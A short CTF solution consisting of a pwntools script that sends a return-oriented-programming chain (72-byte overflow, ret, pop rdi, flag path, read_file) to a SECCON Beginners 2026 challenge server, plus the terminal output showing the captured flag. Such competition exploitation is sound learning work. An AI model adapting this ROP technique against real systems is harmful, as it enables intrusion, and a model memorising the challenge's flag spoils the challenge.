# test.py

```python
┌──(kali㉿kali)-[~/CTF/Seccon_Biginners_2026/rob4b/rop4b]
└─$ cat test.py   
from pwn import *

p = remote("rop4b.beginners.seccon.games", 9082)

POP_RDI  = 0x4011f6  # ←確認してるならOKだが名前と違うので注意
READFILE = 0x4011ff

FLAGPATH = 0x402008  # ←ここは要確認（rodata）

RET = 0x40101a       # retガジェット（適当に探す）

payload  = b"A" * 72
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(FLAGPATH)
payload += p64(READFILE)

p.sendline(payload)
p.interactive()
```

```zsh
┌──(kali㉿kali)-[~/CTF/Seccon_Biginners_2026/rob4b/rop4b]
└─$ python3 test.py
[+] Opening connection to rop4b.beginners.seccon.games on port 9082: Done
[*] Switching to interactive mode
simple ROP challenge
Call read_file("/flag.txt") using ROP!
> ctf4b{3Xp10it_ROP!}

[*] Got EOF while reading in interactive
$  
```